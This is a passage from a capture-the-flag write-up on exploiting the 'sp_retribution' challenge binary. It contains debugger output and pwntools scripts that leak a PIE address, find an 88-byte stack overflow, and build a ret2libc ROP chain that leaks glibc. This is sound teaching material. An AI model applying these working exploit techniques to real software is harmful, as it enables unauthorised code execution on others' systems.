0x00007fffffffe5b0     <span class="code-dark-yellow">f9</span> <span class="code-dark-yellow">01</span> <span class="code-dark-yellow">f2</span> 5d <span class="code-dark-yellow">b9</span> <span class="code-dark-yellow">96</span> 6b 57 <span class="code-dark-yellow">9f</span> 39 <span class="code-dark-yellow">fb</span> 20 46 <span class="code-dark-yellow">85</span> <span class="code-dark-yellow">e5</span> 53    ...]..kW.9. F..S
0x00007fffffffe5c0     <span class="code-dark-yellow">e0</span> <span class="code-dark-yellow">e5</span> <span class="code-dark-green">ff</span> <span class="code-dark-green">ff</span> <span class="code-dark-green">ff</span> <span class="code-dark-yellow">7f</span> <span class="code-grey">00</span> <span class="code-grey">00</span> <span class="code-dark-yellow">9d</span> <span class="code-dark-yellow">0c</span> 40 55 55 55 <span class="code-grey">00</span> <span class="code-grey">00</span>    ..........@UUU..
</code></pre></div><h3 id="pie-bypass">PIE bypass</h3><p>The problem is that all values starting by <code>0x0000555555</code> are address within the binary:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef‚û§  </span>vmmap
[ Legend:  <span class="code-dark-red">Code</span> | <span class="code-dark-green">Heap</span> | <span class="code-dark-magenta">Stack</span> ]
<span class="code-dark-blue">Start              End                Offset             Perm Path</span>
<span class="code-dark-red">0x00555555400000</span> <span class="code-dark-red">0x00555555403000</span> <span class="code-dark-red">0x00000000000000</span> <span class="code-dark-red">r-x</span> <span class="code-dark-red">./sp_retribution</span>
0x00555555602000 0x00555555603000 0x00000000002000 r-- ./sp_retribution
0x00555555603000 0x00555555604000 0x00000000003000 rw- ./sp_retribution
<span class="code-dark-red">0x007ffff7a0d000</span> <span class="code-dark-red">0x007ffff7bcd000</span> <span class="code-dark-red">0x00000000000000</span> <span class="code-dark-red">r-x</span> <span class="code-dark-red">./glibc/libc.so.6</span>
0x007ffff7bcd000 0x007ffff7dcd000 0x000000001c0000 --- ./glibc/libc.so.6
0x007ffff7dcd000 0x007ffff7dd1000 0x000000001c0000 r-- ./glibc/libc.so.6
0x007ffff7dd1000 0x007ffff7dd3000 0x000000001c4000 rw- ./glibc/libc.so.6
0x007ffff7dd3000 0x007ffff7dd7000 0x00000000000000 rw-
<span class="code-dark-red">0x007ffff7dd7000</span> <span class="code-dark-red">0x007ffff7dfd000</span> <span class="code-dark-red">0x00000000000000</span> <span class="code-dark-red">r-x</span> <span class="code-dark-red">./glibc/ld-linux-x86-64.so.2</span>  
0x007ffff7ff3000 0x007ffff7ff6000 0x00000000000000 rw-
0x007ffff7ff6000 0x007ffff7ffa000 0x00000000000000 r-- [vvar]
<span class="code-dark-red">0x007ffff7ffa000</span> <span class="code-dark-red">0x007ffff7ffc000</span> <span class="code-dark-red">0x00000000000000</span> <span class="code-dark-red">r-x</span> <span class="code-dark-red">[vdso]</span>
0x007ffff7ffc000 0x007ffff7ffd000 0x00000000025000 r-- ./glibc/ld-linux-x86-64.so.2
0x007ffff7ffd000 0x007ffff7ffe000 0x00000000026000 rw- ./glibc/ld-linux-x86-64.so.2
0x007ffff7ffe000 0x007ffff7fff000 0x00000000000000 rw-
<span class="code-dark-magenta">0x007ffffffde000</span> <span class="code-dark-magenta">0x007ffffffff000</span> <span class="code-dark-magenta">0x00000000000000</span> <span class="code-dark-magenta">rw-</span> <span class="code-dark-magenta">[stack]</span>
0xffffffffff600000 0xffffffffff601000 0x00000000000000 --x [vsyscall]
</code></pre></div><p>Since strings in C end in a null byte, if we enter exactly 8 bytes, we will see those 8 bytes plus the memory address <code>0x0000555555400d70</code>. Let&rsquo;s try:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef‚û§  </span>continue
Continuing.
AAAAAAA

[*] New coordinates: x = [0x53e5854620fb399f], y = AAAAAAA  
@UUU
[*] Verify new coordinates? (y/n):
</code></pre></div><p>There it is, that <code>@UUU</code> is our memory leak from the binary to bypass PIE. Let&rsquo;s use this Python script to extract this value:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">#!/usr/bin/env python3</span>

<span class="mtk5">from</span><span class="mtk1"> </span><span class="mtk8 mtku">pwn</span><span class="mtk1"> </span><span class="mtk5">import</span><span class="mtk1"> </span><span class="mtk5">*</span>

<span class="mtk1">context</span><span class="mtk1">.</span><span class="mtk1">binary</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span>elf<span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">ELF</span><span class="mtk1">(</span><span class="mtk4">'sp_retribution'</span><span class="mtk1">)</span>
<span class="mtk1">glibc</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">ELF</span><span class="mtk1">(</span><span class="mtk4">'glibc/libc.so.6'</span><span class="mtk1">, </span><span class="mtk9 mtki">checksec</span><span class="mtk5">=</span><span class="mtk6">False</span><span class="mtk1">)</span>


<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">get_process</span><span class="mtk1">():</span>
<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk8">len</span><span class="mtk1">(</span><span class="mtk8 mtku">sys</span><span class="mtk1">.</span><span class="mtk1">argv</span><span class="mtk1">) </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">:</span>
<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> </span>elf<span class="mtk1">.</span><span class="mtk8">process</span><span class="mtk1">()</span>

<span class="mtk1">    </span><span class="mtk1">host</span><span class="mtk1">, </span><span class="mtk1">port</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">sys</span><span class="mtk1">.</span><span class="mtk1">argv</span><span class="mtk1">[</span><span class="mtk6">1</span><span class="mtk1">].</span><span class="mtk8">split</span><span class="mtk1">(</span><span class="mtk4">':'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk8 mtku">remote</span><span class="mtk1">(</span><span class="mtk1">host</span><span class="mtk1">, </span><span class="mtk8 mtku">int</span><span class="mtk1">(</span><span class="mtk1">port</span><span class="mtk1">))</span>


<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">main</span><span class="mtk1">():</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">get_process</span><span class="mtk1">()</span>

<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'&gt;&gt; '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'2'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recvuntil</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'[*] Insert new coordinates:'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'y = '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'AAAAAAA'</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recvuntil</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'y = AAAAAAA</span><span class="mtk6">\n</span><span class="mtk4">'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">leak</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> u64(</span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recvline</span><span class="mtk1">().</span><span class="mtk8">strip</span><span class="mtk1">().</span><span class="mtk8">ljust</span><span class="mtk1">(</span><span class="mtk6">8</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'</span><span class="mtk6">\0</span><span class="mtk4">'</span><span class="mtk1">))</span>

<span class="mtk1">    </span>elf<span class="mtk1">.</span><span class="mtk1">address</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">leak</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">d70</span>
<span class="mtk1">    </span><span class="mtk1">log</span><span class="mtk1">.</span><span class="mtk8">success</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'ELF base address: </span><span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span>elf<span class="mtk1">.</span><span class="mtk1">address</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>  

<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">interactive</span><span class="mtk1">()</span>


<span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk1">__name__</span><span class="mtk1"> </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk4">'__main__'</span><span class="mtk1">:</span>
<span class="mtk1">    </span><span class="mtk8">main</span><span class="mtk1">()</span>
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
[<span class="code-blue">*</span>] './sp_retribution'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-green">Full RELRO</span>
    Stack:    <span class="code-dark-red">No canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-green">PIE enabled</span>
    RUNPATH:  <span class="code-dark-red">b'./glibc/'</span>
[<span class="code-green">+</span>] Starting local process './sp_retribution': pid 2455843  
[<span class="code-green">+</span>] ELF base address: -0xd00
[<span class="code-blue">*</span>] Switching to interactive mode
[*] Verify new coordinates? (y/n): <span class="code-red">$</span>
</code></pre></div><p>Notice that we have substracted <code>0xd70</code> to get the base address of the binary, which looks correct since it ends in <code>000</code> in hexadecimal.</p><h3 id="leaking-glibc-addresses">Leaking Glibc addresses</h3><p>At this point, we can use ROP gadgets from the binary, since we can compute the addresses at runtime.</p><p>First of all, let&rsquo;s find out the offset needed to control the return address:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">gdb</span> -q <span class="mtku">sp_retribution</span>
Reading symbols from <span class="code-dark-green">sp_retribution</span>...
(No debugging symbols found in <span class="code-dark-green">sp_retribution</span>)
<span class="code-red">gef‚û§  </span>pattern create 300
<span class="code-blue">[+]</span> Generating a pattern of 300 bytes (n=8)
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaa  
abfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaa
<span class="code-green">[+]</span> Saved as '$_gef0'
<span class="code-red">gef‚û§  </span>run
Starting program: ./sp_retribution
warning: the debug information found in "./glibc/ld-2.23.so" does not match "./glibc/ld-linux-x86-64.so.2" (CRC mismatch).

warning: the debug information found in "./glibc/libc-2.23.so" does not match "./glibc/libc.so.6" (CRC mismatch).



<span class="code-yellow">                                 Missile Launcher!</span>






<span class="code-yellow">                       ‚ñë</span>
<span class="code-yellow">                                                        ‚ñë      ‚ñë</span>
<span class="code-yellow">                                                     ‚ñì‚ñì             ‚ñë</span>
<span class="code-yellow">                                                 ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì              ‚ñí</span>
<span class="code-yellow">             ‚ñí  ‚ñí                              ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì</span>
<span class="code-yellow">                                             ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì            ‚ñë</span>
<span class="code-yellow">                                            ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì          ‚ñë</span>
<span class="code-yellow">                                           ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì        ‚ñë</span>
<span class="code-yellow">                                         ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñí‚ñí‚ñë‚ñí‚ñë‚ñí‚ñë‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì</span>
<span class="code-yellow">                                       ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñí‚ñí       ‚ñë‚ñë‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì</span>
<span class="code-yellow">                                     ‚ñí‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñí         ‚ñë‚ñë‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì</span>
<span class="code-yellow">                                    ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñí‚ñí          ‚ñë‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì</span>
<span class="code-yellow">                                  ‚ñí‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñí         ‚ñë‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì</span>
<span class="code-yellow">                          ‚ñë       ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñí‚ñë‚ñë   ‚ñë‚ñë‚ñë‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì</span>
<span class="code-yellow">                                ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñí ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì</span>
<span class="code-yellow">                               ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì</span>
<span class="code-yellow">                             ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì   ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì</span>
<span class="code-yellow">                  ‚ñí         ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì    ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì</span>
<span class="code-yellow">                           ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì    ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì</span>
<span class="code-yellow">                           ‚ñì‚ñì‚ñì‚ñì‚ñì    ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì</span>
<span class="code-yellow">                         ‚ñë  ‚ñì‚ñì    ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì</span>
<span class="code-yellow">      ‚ñì                 ‚ñí‚ñë      ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì</span>
<span class="code-yellow">                     ‚ñë‚ñí‚ñí  ‚ñì      ‚ñì‚ñì‚ñì‚ñì‚ñì        ‚ñí                     ‚ñí</span>
<span class="code-yellow">                   ‚ñë‚ñí‚ñí                                              ‚ñì</span>
<span class="code-yellow">                  ‚ñí‚ñí‚ñí       ‚ñí‚ñí</span>
<span class="code-yellow">                ‚ñë‚ñí‚ñí‚ñë      ‚ñí‚ñí‚ñë       ‚ñë</span>
<span class="code-yellow">               ‚ñë‚ñí‚ñí‚ñë   ‚ñë‚ñí‚ñí‚ñí‚ñë         ‚ñë</span>
<span class="code-yellow">              ‚ñë‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñë            ‚ñí</span>
<span class="code-yellow">             ‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñë</span>
<span class="code-yellow">            ‚ñë‚ñí‚ñí‚ñí‚ñí</span>
<span class="code-yellow">           ‚ñë‚ñë                                               ‚ñí</span>



<span class="code-blue">1. Show missiles üöÄ</span>
<span class="code-blue">2. Change target's location üéØ</span>
<span class="code-blue">&gt;&gt; 2</span>

<span class="code-blue">[*] Current target's coordinates: x = [0x53e5854620fb399f], y = [0x576b96b95df201f9]</span>

<span class="code-blue">[*] Insert new coordinates: x = [0x53e5854620fb399f], y = asdf</span>

<span class="code-blue">[*] New coordinates: x = [0x53e5854620fb399f], y = asdf</span>
<span class="code-blue">U</span>
<span class="code-blue">[*] Verify new coordinates? (y/n): aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaa</span>
<span class="code-blue">aaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaa</span>

<span class="code-red">[-] Permission Denied! You need flag.txt in order to proceed. Coordinates have been reset!</span>

<span class="code-blue">Program received signal SIGSEGV, Segmentation fault.</span>
<span class="code-blue">0x0000555555400aeb</span> in <span class="code-dark-yellow">missile_launcher</span> ()
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef‚û§  </span>pattern offset $rsp
<span class="code-blue">[+]</span> Searching for '$rsp'
<span class="code-green">[+]</span> Found at offset 88 (little-endian search) <span class="code-red">likely</span>  
<span class="code-green">[+]</span> Found at offset 81 (big-endian search)
</code></pre></div><p>So, 88 bytes. The following procedure is pretty standard in ret2libc type challenges, here you have some write-ups with an in-depth explanation: <a target="_blank" href="../../../picoctf/binary-exploitation/heres-a-libc">Here&rsquo;s a LIBC</a>, <a target="_blank" href="../shooting-star">Shooting Star</a> and <a target="_blank" href="../../../imaginaryctf/notepad-as-a-service/">Notepad as a Service</a>.</p><p>This is the payload:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk1">rop</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">ROP</span><span class="mtk1">(</span>elf<span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk1">offset</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">88</span>
<span class="mtk1">    </span><span class="mtk1">junk</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7 mtki">b</span><span class="mtk4">'A'</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk1">offset</span>

<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1">  </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">junk</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk1">rop</span><span class="mtk1">.rdi[</span><span class="mtk6">0</span><span class="mtk1">])</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span>elf<span class="mtk1">.</span><span class="mtk1">got</span><span class="mtk1">.puts)</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span>elf<span class="mtk1">.</span>plt<span class="mtk1">.puts)</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span>elf<span class="mtk1">.</span><span class="mtk1">sym</span><span class="mtk1">.main)</span>

<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'[*] Verify new coordinates? (y/n): '</span><span class="mtk1">, </span><span class="mtk1">payload</span><span class="mtk1">)</span>  
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recvline</span><span class="mtk1">()</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recvline</span><span class="mtk1">()</span>

<span class="mtk1">    </span><span class="mtk1">puts_addr</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> u64(</span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recvline</span><span class="mtk1">().</span><span class="mtk8">strip</span><span class="mtk1">().</span><span class="mtk8">ljust</span><span class="mtk1">(</span><span class="mtk6">8</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'</span><span class="mtk6">\0</span><span class="mtk4">'</span><span class="mtk1">))</span>
<span class="mtk1">    </span><span class="mtk1">log</span><span class="mtk1">.</span><span class="mtk8">info</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'Leaked puts() address: </span><span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">puts_addr</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">address</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">puts_addr</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">sym</span><span class="mtk1">.puts</span>
<span class="mtk1">    </span><span class="mtk1">log</span><span class="mtk1">.</span><span class="mtk8">success</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'Glibc base address: </span><span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">address</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">interactive</span><span class="mtk1">()</span>
</code></pre></div><p>At this point, we should get the base address of Glibc and return to <code>main</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
[<span class="code-blue">*</span>] './sp_retribution'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-green">Full RELRO</span>
    Stack:    <span class="code-dark-red">No canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-green">PIE enabled</span>
    RUNPATH:  <span class="code-dark-red">b'./glibc/'</span>
[<span class="code-green">+</span>] Starting local process './sp_retribution': pid 2465010
[<span class="code-green">+</span>] ELF base address: 0x56159d600000
[<span class="code-blue">*</span>] Loaded 14 cached gadgets for 'sp_retribution'
[<span class="code-blue">*</span>] Leaked puts() address: 0x7f272d8096a0
[<span class="code-green">+</span>] Glibc base address: 0x7f272d79a000
[<span class="code-blue">*</span>] Switching to interactive mode


<span class="code-yellow">                                 Missile Launcher!</span>






<span class="code-yellow">                       ‚ñë</span>
<span class="code-yellow">                                                        ‚ñë      ‚ñë</span>
<span class="code-yellow">                                                     ‚ñì‚ñì             ‚ñë</span>
<span class="code-yellow">                                                 ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì              ‚ñí</span>
<span class="code-yellow">             ‚ñí  ‚ñí                              ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì</span>
<span class="code-yellow">                                             ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì            ‚ñë</span>  
<span class="code-yellow">                                            ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì          ‚ñë</span>
<span class="code-yellow">                                           ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì        ‚ñë</span>
<span class="code-yellow">                                         ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñí‚ñí‚ñë‚ñí‚ñë‚ñí‚ñë‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì</span>
<span class="code-yellow">                                       ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñí‚ñí       ‚ñë‚ñë‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì</span>
<span class="code-yellow">                                     ‚ñí‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñí         ‚ñë‚ñë‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì</span>
<span class="code-yellow">                                    ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñí‚ñí          ‚ñë‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì</span>
<span class="code-yellow">                                  ‚ñí‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñí         ‚ñë‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì</span>
<span class="code-yellow">                          ‚ñë       ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñí‚ñë‚ñë   ‚ñë‚ñë‚ñë‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì</span>
<span class="code-yellow">                                ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñí ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì</span>
<span class="code-yellow">                               ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì</span>
<span class="code-yellow">                             ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì   ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì</span>
<span class="code-yellow">                  ‚ñí         ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì    ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì</span>
<span class="code-yellow">                           ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì    ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì</span>
<span class="code-yellow">                           ‚ñì‚ñì‚ñì‚ñì‚ñì    ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì</span>
<span class="code-yellow">                         ‚ñë  ‚ñì‚ñì    ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì</span>
<span class="code-yellow">      ‚ñì                 ‚ñí‚ñë      ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì</span>
